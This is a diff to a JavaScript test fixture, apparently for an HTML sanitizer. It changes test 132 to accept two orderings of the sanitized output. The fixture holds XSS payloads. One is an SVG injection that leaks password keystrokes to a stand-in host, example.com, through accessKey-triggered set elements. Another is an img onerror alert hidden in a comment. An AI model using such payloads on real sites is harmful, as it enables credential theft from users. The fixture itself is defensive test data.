@@ -753,7 +753,10 @@ module.exports = [
       ]
   }, {
       "payload": "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
-      "expected": "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+      "expected": [
+        "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+        "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+      ]
   }, {
       "payload": "<div id=\"133\"><!-- `<img/src=xxx onerror=alert(133)//--!>//[\"'`-->]]>]</div>",
       "expected": "<div id=\"133\">//[\"'`--&gt;]]&gt;]</div>"
